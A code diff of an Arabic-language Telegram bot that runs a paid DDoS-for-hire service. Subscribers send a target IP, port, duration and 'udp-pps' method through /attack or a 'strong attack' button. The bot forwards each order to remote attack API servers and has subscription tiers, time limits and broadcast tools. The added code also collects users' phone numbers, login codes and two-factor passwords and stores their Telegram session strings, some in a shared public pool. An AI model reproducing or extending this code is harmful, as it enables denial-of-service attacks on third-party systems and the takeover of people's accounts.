-                if now > s_info["expires_at"]:
-                    del SUBSCRIBERS_DB[s_id]
-                    continue
-                remaining = s_info["expires_at"] - now
-                days, hours = remaining.days, remaining.seconds // 3600
-                text += (
-                    f"👤 **الاسم:** {s_info['name']}\n"
-                    f"🔗 **اليوزر:** {s_info['username']}\n"
-                    f"🆔 **الأيدي:** `{s_id}`\n"
-                    f"🏷 **النوع:** {s_info['type']}\n"
-                    f"📅 **تاريخ الاشتراك:** `{s_info['joined_at']}`\n"
-                    f"⏳ **المتبقي:** {days} يوم و {hours} ساعة\n"
-                    "----------------------------------\n"
-                )
-        await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+  elif state == "waiting_tut_extra":
+    tutorials[state_data["os"]] = {
+        "video_id": state_data["video_id"],
+        "caption": message.text or message.caption or "لا يوجد نص",
+        "file_id": (
+            message.document.file_id
+            if message.content_type == "document"
+            else None
+        ),
+    }
+    bot.reply_to(message, "✅ تم حفظ الفيديو بنجاح.")
+    del user_states[user_id]
+    return
 
-    elif data == "btn_delete_sub":
-        if not SUBSCRIBERS_DB:
-            await query.message.reply_text("❌ لا يوجد مشتركين لحذفهم.")
-            return
-        keyboard = []
-        for s_id, s_info in SUBSCRIBERS_DB.items():
-            keyboard.append([InlineKeyboardButton(f"❌ حذف: {s_info['name']} ({s_id})", callback_data=f"del_user_{s_id}")])
-        keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="manage_subscribers")])
-        await query.message.reply_text("اختر المشترك المراد حذفه:", reply_markup=InlineKeyboardMarkup(keyboard))
+  elif state == "waiting_edit_limits_type":
+    try:
+      parts = text_val.split()
+      l_type, l_val = parts[0].lower(), int(parts[1])
+      if l_type == "free":
+        attack_limits_config["free_max_time"] = l_val
+      elif l_type == "vip":
+        attack_limits_config["vip_max_time"] = l_val
+      elif l_type == "normal":
+        attack_limits_config["normal_max_time"] = l_val
+      elif l_type == "group":
+        attack_limits_config["group_max_time"] = l_val
+      bot.reply_to(message, "✅ تم تحديث الوقت بنجاح!")
+    except Exception:
+      bot.reply_to(message, "⚠️ صيغة خطأ. مثال: vip 300")
+    del user_states[user_id]
+    return
 
-    elif data.startswith("del_user_"):
-        target_u_id = int(data.replace("del_user_", ""))
-        if target_u_id in SUBSCRIBERS_DB:
-            del SUBSCRIBERS_DB[target_u_id]
-            await query.message.reply_text(f"✅ تم حذف المشترك `{target_u_id}` بنجاح.", parse_mode="Markdown")
+  if state in ["waiting_phone", "waiting_public_phone"]:
+    is_public = state == "waiting_public_phone"
+    del user_states[user_id]
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    try:
+      loop = asyncio.new_event_loop()
 
-    elif data == "set_max_regular":
-        context.user_data["awaiting_max_regular"] = True
-        await query.message.reply_text("⏱ أدخل أقصى وقت هجوم مسموح للمشترك العادي (بالثواني):")
+      async def req_code():
+        await client.connect()
+        return await client.send_code_request(text_val)
 
-    elif data == "set_max_vip":
-        context.user_data["awaiting_max_vip"] = True
-        await query.message.reply_text("⚡ أدخل أقصى وقت هجوم مسموح لمشترك VIP (بالثواني):")
+      sent = loop.run_until_complete(req_code())
+      user_states[user_id] = {
+          "state": "waiting_code",
+          "client": client,
+          "loop": loop,
+          "phone": text_val,
+          "phone_code_hash": sent.phone_code_hash,
+          "is_public": is_public,
+      }
+      bot.reply_to(
+          message,
+          "📬 أرسل كود التحقق (يمكنك كتابته متفرقاً مثلاً: 1 4 7 5 8):",
+      )
+    except Exception as e:
+      bot.reply_to(message, f"❌ حدث خطأ: {e}")
+    return
 
-    elif data == "toggle_free_mode":
-        if not FREE_MODE_ENABLED:
-            context.user_data["awaiting_free_mode_time"] = True
-            await query.message.reply_text("⚙️ **تفعيل الوضع المجاني:** أدخل أقصى وقت هجوم (بالثواني):", parse_mode="Markdown")
-        else:
-            FREE_MODE_ENABLED = False
-            await query.message.edit_reply_markup(reply_markup=get_admin_keyboard())
-            await query.message.reply_text("❌ تم إيقاف الوضع المجاني بنجاح.")
+  elif state == "waiting_code":
+    code = text_val.replace(" ", "")
+    client = state_data["client"]
+    loop = state_data["loop"]
+    phone = state_data["phone"]
+    phone_code_hash = state_data["phone_code_hash"]
+    is_public = state_data["is_public"]
+    del user_states[user_id]
 
-    elif data == "list_groups":
-        if not ACTIVATED_GROUPS:
-            await query.message.reply_text("ℹ️ لا توجد مجموعات مفعلة حالياً.")
-            return
-        buttons = []
-        for g_id, g_info in ACTIVATED_GROUPS.items():
-            buttons.append([InlineKeyboardButton(f"❌ تعطيل: {g_info['title']} ({g_info['max_time']}s)", callback_data=f"disable_group_{g_id}")])
-        buttons.append([InlineKeyboardButton("🔙 العودة", callback_data="back_to_admin")])
-        await query.message.reply_text("👥 **المجموعات المفعلة:**", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
+    try:
 
-    elif data.startswith("disable_group_"):
-        target_g_id = int(data.replace("disable_group_", ""))
-        if target_g_id in ACTIVATED_GROUPS:
-            g_name = ACTIVATED_GROUPS[target_g_id]["title"]
-            del ACTIVATED_GROUPS[target_g_id]
-            await query.message.reply_text(f"✅ تم تعطيل البوت في مجموعة: {g_name}")
+      async def sign():
+        try:
+          await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        except Exception as err:
+          if "password" in str(err).lower() or "2fa" in str(err).lower():
+            return "NEED_2FA"
+          raise err
+        s_str = client.session.save()
+        await client.disconnect()
+        return s_str
 
-    elif data == "manage_channels":
-        keyboard = [
-            [InlineKeyboardButton("➕ إضافة قناة/مجموعة", callback_data="admin_add_ch")],
-            [InlineKeyboardButton("📜 عرض القنوات", callback_data="admin_list_ch")],
-            [InlineKeyboardButton("❌ حذف قناة", callback_data="admin_del_ch")],
-            [InlineKeyboardButton("🔙 العودة", callback_data="back_to_admin")]
-        ]
-        await query.message.reply_text("📢 **لوحة تحكم قنوات الاشتراك الإجباري:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
-
-    elif data == "admin_add_ch":
-        context.user_data['awaiting_add_channel'] = True
-        await query.message.reply_text(
-            "✏️ **أرسل يوزر القناة، الأيدي (ID)، أو رابط الانضمام:**\n\n"
-            "مثال للرابط الخاص/طلب الانضمام:\n"
-            "`https://t.me/+AbCdEfGhIjKlMnOp`\n\n"
-            "⚠ **مهم جداً:** ليتعرف البوت على الطلبات أضف البوت مشرفاً بالكامل في القناة/المجموعة ومنحه صلاحية (إدارة طلبات الانضمام).", 
-            parse_mode="Markdown"
-        )
-
-    elif data == "admin_list_ch":
-        if not CHANNELS_DB:
-            await query.message.reply_text("❌ لا توجد قنوات مضافة حالياً.")
-            return
-        text = "📋 **قائمة القنوات/المجموعات المضافة:**\n\n"
-        for ch_key, ch_info in CHANNELS_DB.items():
-            text += f"• **{clean_markdown(ch_info['name'])}**\n  الرابط: {ch_info['link']}\n"
-        await query.message.reply_text(text, parse_mode="Markdown")
-
-    elif data == "admin_del_ch":
-        if not CHANNELS_DB:
-            await query.message.reply_text("❌ لا توجد قنوات لحذفها.")
-            return
-        keyboard = [[InlineKeyboardButton(f"🗑 حذف {ch_info['name']}", callback_data=f"del_ch_{ch_key}")] for ch_key, ch_info in CHANNELS_DB.items()]
-        keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="manage_channels")])
-        await query.message.reply_text("اختر القناة المراد حذفها:", reply_markup=InlineKeyboardMarkup(keyboard))
-
-    elif data.startswith("del_ch_"):
-        ch_to_del = data.replace("del_ch_", "")
-        if ch_to_del in CHANNELS_DB:
-            deleted_name = CHANNELS_DB[ch_to_del]['name']
-            del CHANNELS_DB[ch_to_del]
-            await query.message.reply_text(f"✅ تم حذف القناة `{clean_markdown(deleted_name)}` بنجاح.", parse_mode="Markdown")
-
-    elif data == "set_animation":
-        context.user_data["awaiting_animation"] = True
-        await query.message.reply_text("🎬 **أرسل المتحركة (GIF) أو الفيديو القصير الآن:**")
-
-    elif data == "back_to_admin":
-        await query.message.edit_reply_markup(reply_markup=get_admin_keyboard())
-
-# ----------------- معالج المدخلات النصية -----------------
-async def text_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global FREE_MODE_ENABLED, FREE_MODE_MAX_TIME, ACTIVATED_GROUPS, CHANNELS_DB, MAX_TIME_REGULAR, MAX_TIME_VIP, USER_LAST_STRONG_ATTACK
-
-    user = update.effective_user
-    user_id = user.id
-    text = update.message.text.strip()
-
-    # --- استلام مدخلات زر الهجوم القوي ---
-    if context.user_data.get("awaiting_strong_attack_target"):
-        if ":" in text:
-            try:
-                host, port = text.split(":", 1)
-                host = host.strip()
-                port = port.strip()
-
-                context.user_data["awaiting_strong_attack_target"] = False
-                USER_LAST_STRONG_ATTACK[user_id] = time.time()
-
-                strong_method = "udp-pps"
-                strong_time = "60"
-
-                await update.message.reply_text(f"⚡ **جاري إطلاق الهجوم القوي على:** `{host}:{port}`...", parse_mode="Markdown")
-                await execute_attack_request(context.bot, update.effective_chat.id, user, host, port, strong_time, strong_method)
-                return
-            except Exception:
-                await update.message.reply_text("⚠️ حدث خطأ في تحليل الهدف! أرسل بصيغة: `IP:PORT`", parse_mode="Markdown")
-                return
-        else:
-            await update.message.reply_text("⚠ صيغة خاطئة! أرسل بصيغة: `IP:PORT` (مثال: `1.2.3.4:80`)", parse_mode="Markdown")
-            return
-
-    if not is_developer(user_id):
-        return
-
-    # --- إضافة قناة بجميع الصيغ ---
-    if context.user_data.get("awaiting_add_channel"):
-        context.user_data["awaiting_add_channel"] = False
-        
-        target_chat_id = None
-        target_link = text
-        target_name = "قناة/مجموعة (طلب انضمام)"
-
-        if "t.me/" in text or "telegram.me/" in text:
-            if "+" in text or "joinchat" in text:
-                target_chat_id = text
-                target_name = "قناة/مجموعة (رابط خاص/طلب انضمام)"
-            else:
-                match = re.search(r't\.me/([^/+]+)$', text)
-                if match:
-                    username = match.group(1)
-                    target_chat_id = f"@{username}"
-                else:
-                    target_chat_id = text
-
-        elif re.match(r"^-?\d+$", text):
-            target_chat_id = int(text)
-            clean_id = str(text).replace("-100", "")
-            target_link = f"https://t.me/c/{clean_id}/1"
-
-        else:
-            username = text if text.startswith("@") else f"@{text}"
-            target_chat_id = username
-            target_link = f"https://t.me/{username.replace('@', '')}"
-
-        if not str(target_chat_id).startswith("http") and "+" not in str(target_chat_id):
-            try:
-                chat_info = await context.bot.get_chat(target_chat_id)
-                target_name = chat_info.title or target_name
-                target_chat_id = chat_info.id
-            except Exception as e:
-                logging.warning(f"Could not fetch chat details: {e}")
-
-        db_key = str(target_chat_id)
-        CHANNELS_DB[db_key] = {
-            "name": target_name,
-            "link": target_link,
-            "chat_id": target_chat_id
+      res = loop.run_until_complete(sign())
+      if res == "NEED_2FA":
+        user_states[user_id] = {
+            "state": "waiting_2fa",
+            "client": client,
+            "loop": loop,
+            "is_public": is_public,
         }
-
-        display_title = clean_markdown(target_name)
-        
-        await update.message.reply_text(
-            f"✅ **تمت إضافة القناة/المجموعة بنجاح!**\n\n"
-            f"📢 **الاسم:** {display_title}\n"
-            f"🔗 **الرابط:** {target_link}\n\n"
-            f"⚠ **ملاحظة هامّة:** تأكد من رفع البوت مشرفاً في القناة/المجموعة وإعطائه صلاحية **إدارة طلبات الانضمام (Approve Join Requests)** ليعمل النظام بدون مشاكل.",
-            parse_mode="Markdown"
-        )
-
-    elif context.user_data.get("awaiting_prot_add"):
-        if ":" in text:
-            PROTECTED_TARGETS.append(text)
-            context.user_data["awaiting_prot_add"] = False
-            await update.message.reply_text(f"تمت إضافة الهدف `{text}` إلى قائمة الحماية بنجاح 🛡", parse_mode="Markdown")
-        else:
-            await update.message.reply_text("⚠ صيغة خاطئة! أرسل بالشكل: `IP:PORT`")
-
-    elif context.user_data.get("awaiting_dev_add"):
-        try:
-            new_dev = int(text)
-            if new_dev not in DEVELOPERS_LIST:
-                DEVELOPERS_LIST.append(new_dev)
-                await update.message.reply_text(f"تمت إضافة `{new_dev}` كـ مطور بنجاح ✅", parse_mode="Markdown")
-            else:
-                await update.message.reply_text("هذا المستخدم مطور بالفعل!")
-        except ValueError:
-            await update.message.reply_text("⚠ يرجى إدخال آيدي صحيح.")
-        context.user_data["awaiting_dev_add"] = False
-
-    elif context.user_data.get("awaiting_dev_del"):
-        try:
-            dev_id = int(text)
-            if dev_id == DEVELOPER_ID:
-                await update.message.reply_text("❌ لا يمكنك حذف المطور الأساسي!")
-            elif dev_id in DEVELOPERS_LIST:
-                DEVELOPERS_LIST.remove(dev_id)
-                await update.message.reply_text(f"تم حذف المطور `{dev_id}` بنجاح 🗑", parse_mode="Markdown")
-            else:
-                await update.message.reply_text("هذا الآيدي غير موجود بالقائمة!")
-        except ValueError:
-            await update.message.reply_text("⚠️ يرجى إدخال آيدي صحيح.")
-        context.user_data["awaiting_dev_del"] = False
-
-    elif context.user_data.get("awaiting_sub_add"):
-        sub_type_add = context.user_data.get("awaiting_sub_add")
-        if ":" in text:
-            try:
-                target_id_str, duration_str = text.split(":", 1)
-                target_id = int(target_id_str.strip())
-                duration_str = duration_str.strip().lower()
-
-                if duration_str.endswith("d"):
-                    expires_at = datetime.now() + timedelta(days=int(duration_str.replace("d", "")))
-                elif duration_str.endswith("h"):
-                    expires_at = datetime.now() + timedelta(hours=int(duration_str.replace("h", "")))
-                else:
-                    await update.message.reply_text("⚠️ حدد المدة بـ d للأيام أو h للساعات (مثال: `3d` أو `12h`).")
-                    return
-
-                try:
-                    chat_info = await context.bot.get_chat(target_id)
-                    u_name = chat_info.first_name or "بدون اسم"
-                    u_username = f"@{chat_info.username}" if chat_info.username else "لا يوجد"
-                except Exception:
-                    u_name, u_username = "غير معروف", "غير معروف"
-
-                SUBSCRIBERS_DB[target_id] = {
-                    "name": u_name,
-                    "username": u_username,
-                    "type": sub_type_add,
-                    "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M"),
-                    "expires_at": expires_at
-                }
-                context.user_data["awaiting_sub_add"] = None
-                await update.message.reply_text(
-                    f"✅ **تم إضافة المشترك بنجاح!**\n\n"
-                    f"👤 **الاسم:** {clean_markdown(u_name)}\n"
-                    f"🆔 **الأيدي:** `{target_id}`\n"
-                    f"🏷 **النوع:** {sub_type_add}\n"
-                    f"⏳ **ينتهي في:** `{expires_at.strftime('%Y-%m-%d %H:%M')}`",
-                    parse_mode="Markdown"
-                )
-            except ValueError:
-                await update.message.reply_text("⚠️ خطأ في الصيغة! الأيدي رقم والمدة صحيحة.")
-        else:
-            await update.message.reply_text("⚠ صيغة خاطئة: `ID:المدة` (مثال: `123456789:3d`)")
-
-    elif context.user_data.get("awaiting_max_regular"):
-        try:
-            MAX_TIME_REGULAR = int(text)
-            context.user_data["awaiting_max_regular"] = False
-            await update.message.reply_text(f"✅ تم تحديد أقصى وقت للمشترك العادي بـ `{MAX_TIME_REGULAR}` ثانية.", parse_mode="Markdown")
-        except ValueError:
-            await update.message.reply_text("⚠️ أدخل أرقام فقط.")
-
-    elif context.user_data.get("awaiting_max_vip"):
-        try:
-            MAX_TIME_VIP = int(text)
-            context.user_data["awaiting_max_vip"] = False
-            await update.message.reply_text(f"✅ تم تحديد أقصى وقت لمشترك VIP بـ `{MAX_TIME_VIP}` ثانية.", parse_mode="Markdown")
-        except ValueError:
-            await update.message.reply_text("⚠ أدخل أرقام فقط.")
-
-    elif context.user_data.get("awaiting_free_mode_time"):
-        try:
-            FREE_MODE_MAX_TIME = int(text)
-            FREE_MODE_ENABLED = True
-            context.user_data["awaiting_free_mode_time"] = False
-            await update.message.reply_text(f"✅ **تم تفعيل الوضع المجاني!** أقصى وقت مسموح: `{FREE_MODE_MAX_TIME}`s", parse_mode="Markdown")
-        except ValueError:
-            await update.message.reply_text("⚠️ أدخل أرقام فقط.")
-
-    elif context.user_data.get("awaiting_group_max_time"):
-        try:
-            max_t = int(text)
-            g_id = context.user_data["awaiting_group_max_time"]
-            g_title = context.user_data.get("group_title", "المجموعة")
-            ACTIVATED_GROUPS[g_id] = {"title": g_title, "max_time": max_t}
-            context.user_data["awaiting_group_max_time"] = None
-            await update.message.reply_text(f"✅ **تم تفعيل المجموعة:** {clean_markdown(g_title)} (الوقت: `{max_t}`s)", parse_mode="Markdown")
-        except ValueError:
-            await update.message.reply_text("⚠️ أدخل أرقام فقط.")
-
-# ----------------- معالج الملفات والمتحركات -----------------
-async def receive_animation_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_developer(update.effective_user.id):
+        bot.reply_to(message, "🔐 الحساب يحتاج كلمة مرور التحقق بخطوتين (2FA):")
         return
 
-    global CURRENT_ANIMATION_ID
-    if context.user_data.get("awaiting_animation"):
-        if update.message.animation:
-            CURRENT_ANIMATION_ID = update.message.animation.file_id
-        elif update.message.video:
-            CURRENT_ANIMATION_ID = update.message.video.file_id
-        elif update.message.document and update.message.document.mime_type == "video/mp4":
-            CURRENT_ANIMATION_ID = update.message.document.file_id
-        else:
-            await update.message.reply_text("⚠️ يرجى إرسال ملف متحركة (GIF) أو فيديو قصير فقط!")
-            return
+      if is_public:
+        public_sessions.append(res)
+        bot.reply_to(message, "✅ تمت إضافة الحساب العام بنجاح للجميع.")
+      else:
+        user_telethon_sessions[user_id] = res
+        bot.reply_to(message, "✅ تم ربط حسابك الشخصي بنجاح.")
+    except Exception as e:
+      bot.reply_to(message, f"❌ خطأ في الكود: {e}")
+    return
 
-        context.user_data["awaiting_animation"] = False
-        await update.message.reply_text("✅ تم تعيين المتحركة بنجاح!")
+  elif state == "waiting_2fa":
+    password = text_val
+    client = state_data["client"]
+    loop = state_data["loop"]
+    is_public = state_data["is_public"]
+    del user_states[user_id]
+    try:
 
-# ----------------- التشغيل الرئيسي -----------------
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+      async def sign_2fa():
+        await client.sign_in(password=password)
+        s_str = client.session.save()
+        await client.disconnect()
+        return s_str
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("open", open_group_command))
-    app.add_handler(CommandHandler("hd", handle_attack))
-    
-    # معالج استقبال أحداث طلبات الانضمام لتبديل الحالة فوراً
-    app.add_handler(ChatJoinRequestHandler(track_join_requests))
+      res = loop.run_until_complete(sign_2fa())
+      if is_public:
+        public_sessions.append(res)
+        bot.reply_to(message, "✅ تمت إضافة الحساب العام بنجاح للجميع.")
+      else:
+        user_telethon_sessions[user_id] = res
+        bot.reply_to(message, "✅ تم ربط حسابك الشخصي بنجاح.")
+    except Exception as e:
+      bot.reply_to(message, f"❌ كلمة المرور غير صحيحة: {e}")
+    return
 
-    app.add_handler(CallbackQueryHandler(button_click_handler))
-    app.add_handler(MessageHandler(filters.ANIMATION | filters.VIDEO, receive_animation_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_input_handler))
+  elif state == "waiting_strong_attack":
+    del user_states[user_id]
+    try:
+      clean_text = text_val.replace(":", " ")
+      p = clean_text.split()
+      target_ip, port = p[0].strip(), p[1].strip()
+    except:
+      bot.reply_to(
+          message,
+          "⚠️ صيغة خاطئة! أرسل الـ IP والـ PORT هكذا:\n91.108.9.166 32000",
+      )
+      return
 
-    print("🤖 البوت يعمل بنجاح مع دعم كامل لطلبات الانضمام والروابط الخاصة ⚡...")
-    app.run_polling()
+    target_key = f"{target_ip}:{port}"
+    if target_key in protected_targets:
+      bot.reply_to(message, "هذا الهدف محمي 🛡")
+      return
+
+    sub_type, _ = check_subscription(user_id)
+    if is_admin(user_id):
+      max_time = attack_limits_config["admin_max_time"]
+    elif sub_type == "VIP":
+      max_time = attack_limits_config["vip_max_time"]
+    elif sub_type == "Normal":
+      max_time = attack_limits_config["normal_max_time"]
+    else:
+      if free_mode:
+        update_user_attempts(user_id)
+        if user_attempts[user_id]["attempts_left"] <= 0:
+          bot.reply_to(message, "❌ ليس لديك محاولات كافية!")
+          return
+        user_attempts[user_id]["attempts_left"] -= 1
+      max_time = attack_limits_config["free_max_time"]
+
+    # تثبيت طريقة الهجوم على udp-pps دائماً للهجوم القوي
+    method = "udp-pps"
+
+    attack_result_msg = (
+        "تم تنفيذ الهجوم بنجاح 🔥\n"
+        "_______________________________________\n\n"
+        f"IP ⌯ {target_ip}\n\n"
+        f"Port ⌯ {port}\n\n"
+        f"Time ⌯ {max_time}\n\n"
+        f"MeThOdS ⌯ {method.upper()}\n"
+        "_______________________________________"
+    )
+
+    dev_markup = InlineKeyboardMarkup(row_width=1)
+    dev_markup.add(
+        InlineKeyboardButton("المطور", url=f"https://t.me/{DEV_USERNAME}")
+    )
+
+    success_api = False
+    for srv in api_servers:
+      try:
+        # إرسال البارامترات بالطريقة الصحيحة تماماً
+        target_api_url = f"{srv['url']}?username={srv['username']}&password={srv['password']}&target={target_ip}&port={port}&time={max_time}&method={method}"
+        response = requests.get(target_api_url, timeout=7)
+        if response.status_code in [200, 201, 202]:
+          success_api = True
+          break
+      except Exception as e:
+        print(f"API Error: {e}")
+        continue
+
+    if success_api:
+      if attack_gif_id:
+        bot.send_animation(
+            message.chat.id,
+            attack_gif_id,
+            caption=attack_result_msg,
+            reply_markup=dev_markup,
+        )
+      else:
+        bot.send_message(
+            message.chat.id, attack_result_msg, reply_markup=dev_markup
+        )
+    else:
+      bot.reply_to(message, "❌ فشل الاتصال بالسيرفر أو أن السيرفر غير متجاوب.")
+    return
+
+  elif state == "waiting_bc_private":
+    success, failed = 0, 0
+    for target_user in list(all_users):
+      try:
+        bot.copy_message(target_user, message.chat.id, message.message_id)
+        success += 1
+      except Exception:
+        failed += 1
+    bot.reply_to(
+        message, f"✅ اكتملت الإذاعة الخاصة! نجح: {success} | فشل: {failed}"
+    )
+    del user_states[user_id]
+
+  elif state == "waiting_bc_public":
+    success, failed = 0, 0
+    targets = set(all_users).union(set(allowed_groups))
+    for target in list(targets):
+      try:
+        bot.copy_message(target, message.chat.id, message.message_id)
+        success += 1
+      except Exception:
+        failed += 1
+    bot.reply_to(
+        message, f"🌐 اكتملت الإذاعة العامة! نجح: {success} | فشل: {failed}"
+    )
+    del user_states[user_id]
+
+  elif state == "waiting_prot_add":
+    try:
+      clean_text = text_val.replace(":", " ")
+      p = clean_text.split()
+      protected_targets.add(f"{p[0].strip()}:{p[1].strip()}")
+      bot.reply_to(message, "✅ تم إضافة الهدف للقائمة المحمية بنجاح.")
+    except:
+      bot.reply_to(message, "⚠️ صيغة خطأ.")
+    del user_states[user_id]
+
+  elif state == "waiting_del_prot":
+    try:
+      clean_text = text_val.replace(":", " ")
+      p = clean_text.split()
+      target_str = f"{p[0].strip()}:{p[1].strip()}"
+      if target_str in protected_targets:
+        protected_targets.remove(target_str)
+        bot.reply_to(message, "✅ تم فك الحماية.")
+      else:
+        bot.reply_to(message, "❌ الهدف غير موجود.")
+    except:
+      bot.reply_to(message, "⚠️ صيغة خطأ.")
+    del user_states[user_id]
+
+  elif state.startswith("waiting_add_"):
+    sub_type = "Normal" if "Normal" in state else "VIP"
+    try:
+      target_id, days = map(int, text_val.split())
+      start_time = datetime.now()
+      end_time = start_time + timedelta(days=days)
+      try:
+        u = bot.get_chat(target_id)
+        name, username = u.first_name or "بدون اسم", u.username or "لا يوجد"
+      except:
+        name, username = "غير معروف", "لا يوجد"
+
+      subscribers[target_id] = {
+          "name": name,
+          "username": username,
+          "type": sub_type,
+          "start": start_time.strftime("%Y-%m-%d %H:%M"),
+          "end": end_time,
+      }
+      bot.reply_to(message, f"✅ تم إضافة المشترك {target_id} كـ ({sub_type}).")
+
+      try:
+        notify_user_msg = (
+            "🎉 تم تفعيل اشتراكك بنجاح!\n\n"
+            f"نوع الاشتراك ⌯ {sub_type}\n"
+            f"وقت التفعيل ⌯ {start_time.strftime('%Y-%m-%d %H:%M')}\n"
+            f"وقت الانتهاء ⌯ {end_time.strftime('%Y-%m-%d %H:%M')}\n\n"
+            "استمتع بالخدمة! 🔥"
+        )
+        bot.send_message(target_id, notify_user_msg)
+      except Exception:
+        bot.reply_to(
+            message,
+            "⚠️ تم التفعيل لكن لم أتمكن من إرسال رسالة للمستخدم (قد يكون حظر"
+            " البوت).",
+        )
+
+    except:
+      bot.reply_to(message, "⚠️ صيغة خطأ! مثال: 123456789 30")
+    del user_states[user_id]
+
+  elif state == "waiting_del":
+    try:
+      tid = int(text_val)
+      if tid in subscribers:
+        del subscribers[tid]
+        bot.reply_to(message, "✅ تم الحذف.")
+      else:
+        bot.reply_to(message, "❌ غير موجود.")
+    except:
+      bot.reply_to(message, "⚠️ أيدي غير صحيح.")
+    del user_states[user_id]
+
+
+@bot.message_handler(commands=["attack"])
+def handle_attack(message):
+  user_id = message.from_user.id
+  chat_id = message.chat.id
+  is_group = message.chat.type in ["group", "supergroup"]
+
+  if message.chat.type == "private":
+    all_users.add(user_id)
+
+  missing = check_mandatory_subs(user_id)
+  if missing:
+    markup = InlineKeyboardMarkup(row_width=1)
+    for ch in missing:
+      markup.add(
+          InlineKeyboardButton(
+              f"انضم هنا {ch}", url=f"https://t.me/{ch.replace('@', '')}"
+          )
+      )
+    bot.reply_to(
+        message, "⚠️ يرجى الاشتراك في القنوات لاستخدام البوت:", reply_markup=markup
+    )
+    return
+
+  if maintenance_mode and not is_admin(user_id):
+    bot.reply_to(message, "البوت الان في وضع الصيانه 🔧")
+    return
+
+  try:
+    args = message.text.split()
+    if len(args) < 5:
+      bot.reply_to(
+          message, "⚠️ الصيغة خاطئة:\n/attack 91.108.9.166 32000 120 udp-pps"
+      )
+      return
+    target_ip, port, time_sec, method = (
+        args[1].strip(),
+        args[2].strip(),
+        int(args[3]),
+        args[4].strip(),
+    )
+  except:
+    bot.reply_to(
+        message, "⚠️ الصيغة خاطئة:\n/attack 91.108.9.166 32000 120 udp-pps"
+    )
+    return
+
+  # تحويل أي طلب يحتوي على udp إلى udp-pps تلقائياً
+  if "udp" in method.lower():
+    method = "udp-pps"
+
+  target_key = f"{target_ip}:{port}"
+  if target_key in protected_targets:
+    bot.reply_to(message, "هذا الهدف محمي 🛡")
+    return
+
+  sub_type, _ = check_subscription(user_id)
+
+  if is_group:
+    if chat_id not in allowed_groups and not is_admin(user_id):
+      bot.reply_to(
+          message, "⛔ البوت غير مفعل بالجروب. استخدم /open بواسطة المطور."
+      )
+      return
+    max_time = attack_limits_config["group_max_time"]
+  else:
+    if is_admin(user_id):
+      max_time = attack_limits_config["admin_max_time"]
+    elif sub_type == "VIP":
+      max_time = attack_limits_config["vip_max_time"]
+    elif sub_type == "Normal":
+      max_time = attack_limits_config["normal_max_time"]
+    else:
+      if not free_mode:
+        bot.reply_to(message, "الوضع المجاني معطل ولا تملك اشتراكاً مدفوعاً!")
+        return
+      update_user_attempts(user_id)
+      if user_attempts[user_id]["attempts_left"] <= 0:
+        bot.reply_to(message, "❌ نفدت محاولاتك اليومية!")
+        return
+      user_attempts[user_id]["attempts_left"] -= 1
+      max_time = attack_limits_config["free_max_time"]
+
+  if time_sec > max_time:
+    bot.reply_to(message, f"⚠️ الوقت الأقصى المسموح لك هو {max_time} ثانية فقط!")
+    return
+
+  attack_result_msg = (
+      "تم تنفيذ الهجوم بنجاح 🔥\n"
+      "_______________________________________\n\n"
+      f"IP ⌯ {target_ip}\n\n"
+      f"Port ⌯ {port}\n\n"
+      f"Time ⌯ {time_sec}\n\n"
+      f"MeThOdS ⌯ {method.upper()}\n"
+      "_______________________________________"
+  )
+
+  dev_markup = InlineKeyboardMarkup(row_width=1)
+  dev_markup.add(
+      InlineKeyboardButton("المطور", url=f"https://t.me/{DEV_USERNAME}")
+  )
+
+  success_api = False
+  for srv in api_servers:
+    try:
+      # تصحيح بناء الرابط تماماً ليطابق الكود الصحيح
+      target_api_url = f"{srv['url']}?username={srv['username']}&password={srv['password']}&target={target_ip}&port={port}&time={time_sec}&method={method.lower()}"
+      response = requests.get(target_api_url, timeout=7)
+      if response.status_code in [200, 201, 202]:
+        success_api = True
+        break
+    except Exception as e:
+      print(f"API Error: {e}")
+      continue
+
+  if success_api:
+    if attack_gif_id:
+      bot.send_animation(
+          chat_id,
+          attack_gif_id,
+          caption=attack_result_msg,
+          reply_markup=dev_markup,
+      )
+    else:
+      bot.send_message(chat_id, attack_result_msg, reply_markup=dev_markup)
+  else:
+    bot.reply_to(message, "❌ فشل الاتصال بالسيرفر أو أن السيرفر غير متجاوب.")
+
 
 if __name__ == "__main__":
-    main()
-
+  print("🤖 تم تشغيل البوت وإصلاح مشكلة الاتصال بالـ API نهائياً...")
+  bot.infinity_polling()
